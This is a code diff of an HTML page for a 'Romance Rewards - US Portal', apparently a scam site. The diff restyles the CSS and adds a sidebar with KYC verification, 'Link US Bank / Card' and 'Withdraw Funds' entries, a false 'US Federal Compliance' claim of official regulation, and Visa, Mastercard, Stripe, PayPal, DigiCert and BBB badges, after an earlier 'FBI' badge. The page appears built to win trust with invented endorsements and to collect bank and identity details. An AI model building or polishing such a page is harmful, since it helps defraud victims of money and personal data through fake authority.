@@ -1,549 +1,1055 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Romance Rewards - Portal</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0f172a; color: #f8fafc; min-height: 100vh; }
-        
-        .page { display: none; width: 100%; min-height: 100vh; }
-        .page.active { display: flex; flex-direction: column; }
-        
-        /* Landing Page */
-        #landing-page { padding: 15px 20px; justify-content: center; align-items: center; text-align: center; min-height: 100vh; gap: 12px; }
-        .landing-header h1 { font-size: 1.8rem; color: #38bdf8; margin-bottom: 5px; }
-        
-        .animated-banner { 
-            font-size: 0.9rem; 
-            color: #f59e0b; 
-            background: rgba(245, 158, 11, 0.1); 
-            border: 1px solid rgba(245, 158, 11, 0.3); 
-            padding: 8px 16px; 
-            border-radius: 30px; 
-            display: inline-block; 
-            font-weight: 600;
-            animation: pulseBlink 1.5s infinite;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Romance Rewards - US Portal</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+/* ပြင်ဆင်လိုက်သော CSS Selector */
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+body { background-color: #0b0f19; color: #f8fafc; min-height: 100vh; }
+.page { display: none; width: 100%; min-height: 100vh; }
+.page.active { display: flex; flex-direction: column; }
 
-        @keyframes pulseBlink {
-            0% { opacity: 0.3; transform: scale(0.98); }
-            50% { opacity: 1; transform: scale(1.02); }
-            100% { opacity: 0.3; transform: scale(0.98); }
-        }
+/* Landing Page */
+#landing-page { padding: 15px 20px; justify-content: center; align-items: center; text-align: center; min-height: 100vh; gap: 8px; }
+.landing-header h1 { font-size: 1.8rem; background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; font-weight: 800; letter-spacing: 0.5px; }
+.landing-header p { font-size: 0.75rem; color: #94a3b8; margin-bottom: 6px; }
 
-        .poster-grid-preview { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; width: 100%; max-width: 380px; margin: 5px auto; }
-        .poster-grid-preview img { width: 100%; height: 75px; object-fit: cover; border-radius: 6px; }
-        
-        .extra-info-text { font-size: 0.85rem; color: #94a3b8; max-width: 350px; line-height: 1.4; }
-        .extra-info-text span { color: #10b981; font-weight: bold; }
+.marquee-container, .marquee-container-payout {
+width: 100%;
+max-width: 420px;
+background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(245, 158, 11, 0.05));
+border: 1px solid rgba(245, 158, 11, 0.4);
+border-radius: 20px;
+padding: 6px 10px;
+margin: 4px auto;
+color: #fbbf24;
+font-size: 0.75rem;
+font-weight: 600;
+box-shadow: 0 0 12px rgba(245, 158, 11, 0.15);
+}
+.marquee-container-payout {
+background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(16, 185, 129, 0.05));
+border: 1px solid rgba(16, 185, 129, 0.4);
+color: #34d399;
+box-shadow: 0 0 12px rgba(16, 185, 129, 0.15);
+}
 
-        .get-started-btn { background-color: #38bdf8; color: #0f172a; border: none; padding: 12px 30px; font-size: 1rem; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; max-width: 350px; margin-top: 5px; }
+.poster-grid-preview {
+display: grid;
+grid-template-columns: repeat(4, 1fr);
+gap: 6px;
+width: 100%;
+max-width: 380px;
+margin: 6px auto;
+}
+.poster-grid-preview img {
+width: 100%;
+height: 52px;
+object-fit: cover;
+border-radius: 6px;
+border: 1px solid rgba(0, 242, 254, 0.3);
+transition: transform 0.2s ease;
+}
+.poster-grid-preview img:hover { transform: scale(1.05); }
 
-        /* Login Page with Blurred Background */
-        #login-page { 
-            align-items: center; 
-            justify-content: center; 
-            padding: 20px; 
-            min-height: 100vh;
-            position: relative;
-            background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.85)), url('https://i.ibb.co/3ynFsqY5/IMG-7614.jpg');
-            background-size: cover;
-            background-position: center;
-        }
-        .login-card { background-color: rgba(30, 41, 59, 0.9); backdrop-filter: blur(10px); padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; border: 1px solid #334155; text-align: left; }
-        .login-card h2 { color: #38bdf8; margin-bottom: 8px; font-size: 1.5rem; }
-        .login-card p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px; }
-        .login-input-group { margin-bottom: 20px; }
-        .login-input-group label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #cbd5e1; }
-        .login-input-group input { width: 100%; padding: 12px 15px; background-color: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 8px; font-size: 1rem; outline: none; }
-        .login-submit-btn { background-color: #38bdf8; color: #0f172a; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; }
+.trust-badges { display: flex; justify-content: center; gap: 12px; font-size: 0.75rem; color: #94a3b8; margin: 6px 0; }
+.trust-badges span { display: flex; align-items: center; gap: 4px; color: #00f2fe; font-weight: 600; }
 
-        /* Dashboard */
-        #dashboard-page { padding-bottom: 80px; display: none; }
-        #dashboard-page.active { display: block; }
-        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #1e293b; position: sticky; top: 0; z-index: 100; }
-        .menu-toggle-btn { background: none; border: none; color: #38bdf8; font-size: 1.5rem; cursor: pointer; }
-        .user-profile-widget { display: flex; align-items: center; gap: 10px; background: rgba(15, 23, 42, 0.4); padding: 5px 12px 5px 5px; border-radius: 30px; border: 1px solid #334155; }
-        .user-avatar-circle { width: 35px; height: 35px; background-color: #38bdf8; color: #0f172a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        .user-email-text { font-size: 0.85rem; color: #cbd5e1; font-weight: 600; }
+.get-started-btn {
+background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+color: #0f172a; border: none; padding: 12px 30px; font-size: 0.95rem;
+font-weight: 800; border-radius: 30px; cursor: pointer; width: 100%; max-width: 350px;
+box-shadow: 0 4px 20px rgba(0, 242, 254, 0.4); transition: all 0.3s ease;
+}
+.get-started-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(0, 242, 254, 0.6); }
 
-        /* Sidebar */
-        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background-color: #1e293b; z-index: 1000; transition: left 0.3s ease; padding: 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
-        .sidebar.open { left: 0; }
-        .sidebar-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #334155; padding-bottom: 15px; }
-        .sidebar-header h3 { color: #38bdf8; font-size: 1.1rem; }
-        .close-menu-btn { background: none; border: none; color: #94a3b8; font-size: 1.2rem; cursor: pointer; }
-        .sidebar-menu-item { display: flex; align-items: center; gap: 12px; padding: 12px 15px; color: #f8fafc; background: #0f172a; border-radius: 8px; cursor: pointer; border: 1px solid #334155; font-weight: 600; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 900; }
-        .overlay.active { display: block; }
+/* Login Page */
+#login-page {
+align-items: center; justify-content: center; padding: 20px; min-height: 100vh;
+background: linear-gradient(rgba(11, 15, 25, 0.9), rgba(11, 15, 25, 0.9)), url('https://i.ibb.co/zhwdB8yv/PNG-image-101.png');
+background-size: cover; background-position: center;
+}
+.login-card { background-color: rgba(30, 41, 59, 0.95); backdrop-filter: blur(15px); padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid rgba(0, 242, 254, 0.3); text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.login-card h2 { color: #00f2fe; margin-bottom: 5px; font-size: 1.5rem; font-weight: 700; }
+.login-card p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
+.login-input-group { margin-bottom: 15px; }
+.login-input-group label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: #cbd5e1; font-weight: 600; }
+.login-input-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+.login-input-group input:focus { border-color: #00f2fe; box-shadow: 0 0 8px rgba(0, 242, 254, 0.3); }
+.login-submit-btn { background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); color: #0f172a; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 0.95rem; cursor: pointer; margin-bottom: 10px; box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3); }
+.login-back-btn { background: transparent; color: #94a3b8; border: 1px solid #334155; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.login-back-btn:hover { background: rgba(255,255,255,0.05); color: #fff; }
 
-        .dashboard-content { padding: 20px; }
-        .banner-earn { background: linear-gradient(135deg, #0284c7, #38bdf8); padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center; color: #0f172a; }
-        .balance-box { background: rgba(15, 23, 42, 0.2); padding: 8px 15px; border-radius: 20px; display: inline-block; margin-top: 10px; font-weight: bold; }
-        .section-title { font-size: 1.1rem; margin-bottom: 15px; color: #38bdf8; border-left: 4px solid #38bdf8; padding-left: 10px; }
-        .image-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
-        @media(min-width: 600px) { .image-grid { grid-template-columns: repeat(4, 1fr); } }
-        .image-card { background-color: #1e293b; border-radius: 10px; overflow: hidden; cursor: pointer; }
-        .image-card img { width: 100%; height: 160px; object-fit: cover; }
-        .image-info { padding: 10px; }
-        .image-title { font-size: 0.9rem; font-weight: 600; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .stars { color: #f59e0b; font-size: 0.85rem; }
+/* Dashboard */
+#dashboard-page { padding-bottom: 80px; display: none; }
+#dashboard-page.active { display: block; }
+.top-nav { display: flex; justify-content: space-between; align-items: center; padding: 14px 20px; background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid rgba(0, 242, 254, 0.2); }
+.menu-toggle-btn {
+background: linear-gradient(135deg, rgba(0, 242, 254, 0.2), rgba(79, 172, 254, 0.2));
+border: 1px solid #00f2fe; color: #00f2fe; width: 40px; height: 40px; border-radius: 12px;
+font-size: 1.2rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
+box-shadow: 0 0 10px rgba(0, 242, 254, 0.3); transition: all 0.3s ease;
+}
+.menu-toggle-btn:hover { background: #00f2fe; color: #0f172a; box-shadow: 0 0 18px rgba(0, 242, 254, 0.6); transform: scale(1.05); }
+.user-profile-widget { display: flex; align-items: center; gap: 10px; background: rgba(15, 23, 42, 0.6); padding: 5px 12px 5px 6px; border-radius: 30px; border: 1px solid rgba(0, 242, 254, 0.3); box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+.user-avatar-circle { width: 34px; height: 34px; background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); color: #0f172a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.95rem; box-shadow: 0 0 8px rgba(0, 242, 254, 0.5); }
+.user-email-text { font-size: 0.8rem; color: #cbd5e1; font-weight: 600; }
 
-        /* Detail Page */
-        #detail-page { padding: 20px; display: none; }
-        #detail-page.active { display: block; }
-        .back-btn { background: #1e293b; border: none; color: #38bdf8; padding: 10px 16px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 20px; font-size: 1rem; }
-        .detail-container { background-color: #1e293b; border-radius: 12px; padding: 20px; max-width: 500px; margin: 0 auto; }
-        .detail-img { width: 100%; height: 280px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; }
-        .rating-box { background: #0f172a; padding: 15px; border-radius: 8px; text-align: center; margin-top: 15px; }
-        .star-rating { font-size: 2rem; color: #cbd5e1; cursor: pointer; margin-bottom: 15px; }
-        .star-rating i.rated { color: #f59e0b; }
-        .submit-rating-btn { background-color: #38bdf8; color: #0f172a; border: none; padding: 12px 20px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; font-size: 1rem; }
+/* SIDEBAR */
+.sidebar { position: fixed; top: 0; left: -320px; width: 310px; height: 100%; background-color: #0b0f19; z-index: 1000; transition: left 0.35s cubic-bezier(0.4, 0, 0.2, 1); padding: 20px; box-shadow: 8px 0 25px rgba(0,0,0,0.8); display: flex; flex-direction: column; overflow-y: auto; border-right: 1px solid rgba(0, 242, 254, 0.2); }
+.sidebar.open { left: 0; }
+.sidebar-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid rgba(0, 242, 254, 0.2); padding-bottom: 12px; }
+.sidebar-header h3 { background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 1.15rem; font-weight: 800; letter-spacing: 0.5px; }
+.close-menu-btn {
+background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171;
+width: 32px; height: 32px; border-radius: 50%; font-size: 1rem; cursor: pointer;
+display: flex; align-items: center; justify-content: center; transition: all 0.2s;
+}
+.close-menu-btn:hover { background: #ef4444; color: #fff; }
+.sidebar-menu-item {
+display: flex; align-items: center; gap: 14px; padding: 13px 16px; color: #f8fafc;
+background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border-radius: 12px;
+cursor: pointer; border: 1px solid rgba(0, 242, 254, 0.25); font-weight: 600;
+margin-bottom: 12px; font-size: 0.88rem; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+.sidebar-menu-item i { font-size: 1.1rem; width: 24px; text-align: center; color: #00f2fe; text-shadow: 0 0 8px rgba(0, 242, 254, 0.5); }
+.sidebar-menu-item:hover {
+border-color: #00f2fe; background: linear-gradient(135deg, rgba(0, 242, 254, 0.2) 0%, #1e293b 100%);
+transform: translateX(6px); box-shadow: 0 6px 20px rgba(0, 242, 254, 0.25); color: #00f2fe;
+}
+.overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; z-index: 900; backdrop-filter: blur(4px); }
+.overlay.active { display: block; }
 
-        /* Bank Connect Page */
-        #bank-connect-page { padding: 20px; display: none; }
-        #bank-connect-page.active { display: block; }
-        .bank-card { background-color: #1e293b; border-radius: 12px; padding: 20px; max-width: 500px; margin: 0 auto; border: 1px solid #334155; }
-        .secure-badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #34d399; padding: 10px; border-radius: 8px; font-size: 0.85rem; text-align: center; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        
-        .bank-options { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 15px; }
-        .bank-opt { background: #0f172a; border: 2px solid #334155; border-radius: 8px; padding: 8px 4px; text-align: center; cursor: pointer; }
-        .bank-opt.selected { border-color: #38bdf8; background: rgba(56, 189, 248, 0.1); }
-        .bank-opt i { font-size: 18px; color: #38bdf8; margin-bottom: 3px; display: block; }
-        .bank-opt span { font-size: 0.65rem; display: block; color: #cbd5e1; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; color: #38bdf8; font-size: 0.9rem; }
-        .form-group input { width: 100%; padding: 12px; background-color: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 8px; font-size: 1rem; outline: none; }
-        
-        .fbi-gold-badge {
-            background: linear-gradient(135deg, rgba(245, 158, 11, 0.15), rgba(217, 119, 6, 0.15));
-            border: 1px solid #f59e0b;
-            color: #ffb703;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 0.8rem;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-weight: bold;
-        }
-        .fbi-gold-badge i { color: #f59e0b; font-size: 1.1rem; }
+/* US Federal Compliance & Logo-Style Circular Badges Section */
+.compliance-section {
+background: linear-gradient(135deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.8));
+border: 1px solid rgba(0, 242, 254, 0.3);
+border-radius: 14px;
+padding: 16px 12px;
+margin-top: auto;
+box-shadow: inset 0 0 15px rgba(0, 242, 254, 0.05);
+}
+.compliance-badge-main {
+display: flex;
+align-items: center;
+gap: 12px;
+border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+padding-bottom: 10px;
+margin-bottom: 12px;
+}
+.federal-logo {
+width: 38px;
+height: 38px;
+object-fit: contain;
+filter: drop-shadow(0 0 8px rgba(0, 242, 254, 0.5));
+}
+.compliance-text h3 {
+font-size: 0.85rem;
+font-weight: 700;
+color: #00f2fe;
+margin: 0 0 2px 0;
+}
+.compliance-text p {
+font-size: 0.68rem;
+color: #94a3b8;
+margin: 0;
+line-height: 1.3;
+}
+.verified-partners-grid {
+display: grid;
+grid-template-columns: repeat(3, 1fr);
+gap: 10px;
+}
+.partner-card {
+background: rgba(30, 41, 59, 0.8);
+border: 1px solid rgba(255, 255, 255, 0.08);
+border-radius: 12px;
+padding: 10px 6px;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+cursor: pointer;
+transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+.partner-card img {
+width: 36px;
+height: 36px;
+object-fit: contain;
+border-radius: 50%;
+background: #0f172a;
+padding: 4px;
+border: 1px solid rgba(0, 242, 254, 0.4);
+transition: transform 0.3s ease;
+}
+.partner-card:hover {
+background: linear-gradient(135deg, rgba(0, 242, 254, 0.2), rgba(79, 172, 254, 0.2));
+border-color: #00f2fe;
+transform: translateY(-2px);
+box-shadow: 0 4px 15px rgba(0, 242, 254, 0.25);
+}
+.partner-card:hover img { transform: scale(1.1); }
 
-        .save-btn { background-color: #10b981; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 5px; font-size: 1rem; }
-    </style>
+/* Main Menu Navigation Container */
+.nav-menu-container {
+text-align: center;
+margin: 15px 0 5px 0;
+}
+.main-menu-btn {
+background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+color: #0a0f1d;
+border: none;
+padding: 10px 22px;
+font-size: 0.85rem;
+font-weight: 700;
+border-radius: 20px;
+cursor: pointer;
+box-shadow: 0 4px 15px rgba(0, 242, 254, 0.4);
+transition: all 0.3s ease;
+width: 100%;
+}
+.main-menu-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 242, 254, 0.6); }
+
+.dashboard-content { padding: 18px 20px; }
+.banner-earn {
+background: rgba(30, 41, 59, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(0, 242, 254, 0.35);
+padding: 16px; border-radius: 18px; margin-bottom: 18px; text-align: center; color: #f8fafc; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+}
+@keyframes fadeInOut {
+0% { opacity: 0.3; transform: scale(0.98); }
+50% { opacity: 1; transform: scale(1); }
+100% { opacity: 0.3; transform: scale(0.98); }
+}
+.fading-title { animation: fadeInOut 3s infinite ease-in-out; font-size: 1.15rem; color: #00f2fe; font-weight: 800; margin-bottom: 4px; }
+.banner-earn p { font-size: 0.78rem; margin-bottom: 8px; color: #94a3b8; }
+.balance-box { background: rgba(15, 23, 42, 0.8); border: 1px solid rgba(52, 211, 153, 0.4); padding: 6px 14px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 800; font-size: 0.9rem; color: #34d399; box-shadow: 0 0 12px rgba(52, 211, 153, 0.2); }
+
+@keyframes pulseGlow {
+0% { opacity: 0.5; text-shadow: 0 0 2px rgba(0,242,254,0.2); }
+50% { opacity: 1; text-shadow: 0 0 12px rgba(0,242,254,0.7); }
+100% { opacity: 0.5; text-shadow: 0 0 2px rgba(0,242,254,0.2); }
+}
+.section-title {
+font-size: 1.05rem; margin-bottom: 14px; color: #00f2fe; border-left: 4px solid #00f2fe;
+padding-left: 10px; animation: pulseGlow 2.5s infinite ease-in-out; font-weight: 800;
+}
+.image-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
+@media(min-width: 600px) { .image-grid { grid-template-columns: repeat(4, 1fr); } }
+.image-card { background-color: #1e293b; border-radius: 12px; overflow: hidden; cursor: pointer; border: 1px solid rgba(0, 242, 254, 0.2); transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+.image-card:hover { transform: translateY(-4px); border-color: #00f2fe; box-shadow: 0 8px 25px rgba(0, 242, 254, 0.3); }
+.image-card img { width: 100%; height: 150px; object-fit: cover; }
+.image-info { padding: 10px; }
+.image-title { font-size: 0.85rem; font-weight: 700; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #f8fafc; }
+.stars { color: #f59e0b; font-size: 0.8rem; }
+
+/* Detail Page */
+#detail-page { padding: 18px 20px; display: none; }
+#detail-page.active { display: block; }
+.back-btn { background: #1e293b; border: 1px solid rgba(0, 242, 254, 0.3); color: #00f2fe; padding: 9px 16px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-size: 0.9rem; font-weight: 600; transition: all 0.2s; }
+.back-btn:hover { background: rgba(0, 242, 254, 0.1); }
+.detail-container { background-color: #1e293b; border-radius: 16px; padding: 20px; max-width: 480px; margin: 0 auto; border: 1px solid rgba(0, 242, 254, 0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.detail-img { width: 100%; height: 260px; object-fit: cover; border-radius: 10px; margin-bottom: 14px; border: 1px solid #334155; }
+.rating-box { background: #0f172a; padding: 15px; border-radius: 12px; text-align: center; margin-top: 14px; border: 1px solid #334155; }
+.star-rating { font-size: 2rem; color: #475569; cursor: pointer; margin-bottom: 14px; }
+.star-rating i.rated { color: #f59e0b; text-shadow: 0 0 10px rgba(245, 158, 11, 0.5); }
+.submit-rating-btn { background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); color: #0f172a; border: none; padding: 12px; font-weight: 800; border-radius: 10px; cursor: pointer; width: 100%; font-size: 0.95rem; box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3); }
+
+/* Common Sub-page & Form Styles */
+.sub-page-container { padding: 18px 20px; display: none; }
+.sub-page-container.active { display: block; }
+.sub-card { background-color: #1e293b; border-radius: 16px; padding: 20px; max-width: 480px; margin: 0 auto; border: 1px solid rgba(0, 242, 254, 0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+.secure-badge { background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.4); color: #34d399; padding: 10px; border-radius: 10px; font-size: 0.82rem; text-align: center; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 600; }
+.method-tabs { display: flex; gap: 10px; margin-bottom: 14px; }
+.method-tab { flex: 1; background: #0f172a; border: 1px solid #334155; padding: 10px; text-align: center; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; color: #94a3b8; transition: all 0.2s; }
+.method-tab.active { border-color: #00f2fe; color: #00f2fe; background: rgba(0, 242, 254, 0.1); box-shadow: 0 0 10px rgba(0, 242, 254, 0.2); }
+.bank-options { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 14px; }
+.bank-opt { background: #0f172a; border: 2px solid #334155; border-radius: 8px; padding: 8px 4px; text-align: center; cursor: pointer; transition: all 0.2s; }
+.bank-opt.selected { border-color: #00f2fe; background: rgba(0, 242, 254, 0.15); box-shadow: 0 0 10px rgba(0, 242, 254, 0.2); }
+.bank-opt i { font-size: 18px; color: #00f2fe; margin-bottom: 3px; display: block; }
+.bank-opt span { font-size: 0.65rem; display: block; color: #cbd5e1; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.form-group { margin-bottom: 14px; }
+.form-group label { display: block; margin-bottom: 6px; color: #00f2fe; font-size: 0.88rem; font-weight: 600; }
+.form-group input, .form-group select { width: 100%; padding: 11px 12px; background-color: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 10px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+.form-group input:focus, .form-group select:focus { border-color: #00f2fe; box-shadow: 0 0 8px rgba(0, 242, 254, 0.3); }
+.save-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 13px; width: 100%; border-radius: 10px; font-weight: 800; cursor: pointer; margin-top: 6px; font-size: 0.98rem; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: all 0.2s; }
+.save-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5); }
+
+/* Modal Popup Styles */
+.modal-overlay {
+display: none;
+position: fixed;
+top: 0; left: 0;
+width: 100%; height: 100%;
+background: rgba(5, 8, 17, 0.85);
+backdrop-filter: blur(8px);
+z-index: 2000;
+justify-content: center;
+align-items: center;
+padding: 20px;
+}
+.modal-content-card {
+background: linear-gradient(145deg, #121b30, #0a0f1d);
+border: 1px solid #00f2fe;
+border-radius: 20px;
+padding: 25px 20px 20px 20px;
+width: 100%;
+max-width: 420px;
+position: relative;
+box-shadow: 0 0 40px rgba(0, 242, 254, 0.25);
+animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+@keyframes modalPop {
+0% { transform: scale(0.8); opacity: 0; }
+100% { transform: scale(1); opacity: 1; }
+}
+.modal-back-btn {
+background: rgba(0, 242, 254, 0.1);
+border: 1px solid rgba(0, 242, 254, 0.3);
+color: #00f2fe;
+padding: 6px 12px;
+border-radius: 8px;
+font-size: 0.8rem;
+font-weight: 600;
+cursor: pointer;
+display: inline-flex;
+align-items: center;
+gap: 6px;
+margin-bottom: 15px;
+transition: all 0.2s;
+}
+.modal-back-btn:hover {
+background: rgba(0, 242, 254, 0.2);
+}
+</style>
 </head>
 <body>
+<div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
 
-    <div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
+<!-- SIDEBAR MENU -->
+<div class="sidebar" id="sidebar">
+<div class="sidebar-header">
+<h3>ROMANCE REWARDS</h3>
+<button class="close-menu-btn" onclick="toggleSidebar()"><i class="fa-solid fa-xmark"></i></button>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('account-page')">
+<i class="fa-solid fa-id-card"></i> <span>Account Verification (KYC)</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('bank-connect-page')">
+<i class="fa-solid fa-building-columns"></i> <span>Link US Bank / Card</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('balance-page')">
+<i class="fa-solid fa-file-invoice-dollar"></i> <span>Balance & Statement</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('withdraw-page')">
+<i class="fa-solid fa-money-bill-transfer"></i> <span>Withdraw Funds</span>
+</div>
+<div class="sidebar-menu-item" onclick="openSubPage('support-page')">
+<i class="fa-solid fa-headset"></i> <span>Customer Support</span>
+</div>
 
-    <div class="sidebar" id="sidebar">
-        <div class="sidebar-header">
-            <h3>Navigation Menu</h3>
-            <button class="close-menu-btn" onclick="toggleSidebar()"><i class="fa-solid fa-xmark"></i></button>
-        </div>
-        
-        <div class="sidebar-menu-item" onclick="openBankPage()" style="margin-bottom: 15px;">
-            <i class="fa-solid fa-university"></i> US Bank Online Connect
-        </div>
+<div class="compliance-section">
+<div class="compliance-badge-main">
+<img src="https://i.ibb.co/C3bp3Z3M/IMG-7802.png" alt="US Federal Compliance" class="federal-logo">
+<div class="compliance-text">
+<h3>US Federal Compliance</h3>
+<p>Authorized & Officially Regulated under US Digital Consumer & Rewards Standard Guidelines</p>
+</div>
+</div>
+<div class="verified-partners-grid">
+<div class="partner-card" onclick="openModal('visa')">
+<img src="https://i.ibb.co/vvZ6VSBn/IMG-7801.png" alt="VISA">
+</div>
+<div class="partner-card" onclick="openModal('mastercard')">
+<img src="https://i.ibb.co/nMjCvdPp/IMG-7800.png" alt="Mastercard">
+</div>
+<div class="partner-card" onclick="openModal('stripe')">
+<img src="https://i.ibb.co/XZD440F5/IMG-7799.jpg" alt="Stripe">
+</div>
+<div class="partner-card" onclick="openModal('paypal')">
+<img src="https://i.ibb.co/Wv8nF4Np/IMG-7798.png" alt="PayPal">
+</div>
+<div class="partner-card" onclick="openModal('digicert')">
+<img src="https://i.ibb.co/Swp4m90s/IMG-7797.png" alt="DigiCert">
+</div>
+<div class="partner-card" onclick="openModal('bbb')">
+<img src="https://i.ibb.co/MxyJ1T2C/IMG-7796.png" alt="BBB">
+</div>
+</div>
+</div>
 
-        <div class="sidebar-menu-item" style="background: rgba(245, 158, 11, 0.1); border-color: rgba(245, 158, 11, 0.3); color: #f59e0b; cursor: default; margin-bottom: 15px;">
-            <i class="fa-solid fa-shield-halved"></i> Security Verified
-        </div>
+<div class="nav-menu-container">
+<button class="main-menu-btn" onclick="navigateToMainMenu()">
+<i class="fas fa-th-large"></i> Main Menu
+</button>
+</div>
+</div>
 
